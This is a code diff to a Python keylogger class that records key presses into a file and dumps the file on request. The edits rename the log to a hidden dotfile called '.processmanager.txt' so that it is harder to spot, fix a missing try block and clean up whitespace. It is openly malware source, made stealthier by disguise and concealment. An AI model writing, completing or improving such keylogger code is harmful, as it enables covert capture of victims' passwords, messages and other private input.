@@ -14,7 +14,7 @@ class Keylogger:
 	def __key_press(self, key):
 		self.keys.append(key)
 		self.isKeyPressed = True
-		location = "~/Documents/processmanager.txt"
+		location = ".processmanager.txt"
 		if self.isKeyPressed:
 			with open(location, "a") as file:
 				for key in self.keys:
@@ -28,12 +28,12 @@ class Keylogger:
 					elif k.find("enter") > 0:
 						file.write("\n")
 					elif k.find("caps_lock") > 0:
-						file.write(" capslock ")	
+						file.write(" capslock ")
 					else:
-						file.write(k)		
+						file.write(k)
 
 			self.keys = []
-			self.isKeyPressed = False	
+			self.isKeyPressed = False
 
 	def start_dumps(self):
 		global listener
@@ -41,15 +41,15 @@ class Keylogger:
 			listener.join()
 
 	def dump_keys(self):
-		location = "~/Documents/processmanager.txt"
+		location = ".processmanager.txt"
+		try:
 			with open(location, "rt") as file:
 				keys = file.read()
 			os.remove(location)
 			return keys
 		except FileNotFoundError:
-			return f'{colored("[i] ", "yellow")}' + "you haven't captured any keystrokes yet."		
+			return f'{colored("[i] ", "yellow")}' + "you haven't captured any keystrokes yet."
 
 	def stop_dumps(self):
 		listener.stop()
 		os.remove(location)
-			
